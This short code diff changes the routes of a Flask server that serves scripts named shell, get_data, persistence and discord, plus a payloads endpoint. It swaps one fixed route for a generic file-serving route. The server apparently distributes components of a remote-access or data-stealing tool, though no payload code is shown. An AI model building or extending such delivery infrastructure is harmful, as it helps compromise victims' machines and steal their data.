@@ -38,7 +38,6 @@ def term(path):
 def shell():
     return render_template("client/shell.py")
 
-
 @app.route("/get_data.py")
 def get_data():
     return render_template("client/get_data.py")
@@ -51,9 +50,10 @@ def client_data():
 def persistence():
     return render_template("client/persistence.py")
 
-@app.route('/discord.py')
-def discord():
-    return render_template("client/discord.py")
+
+@app.route('/client/<path:filename>')
+def client(filename):
+    return send_from_directory('templates/client', filename)
 
 @app.route('/get_payloads/<path:filename>')
 def get_payloads(filename):
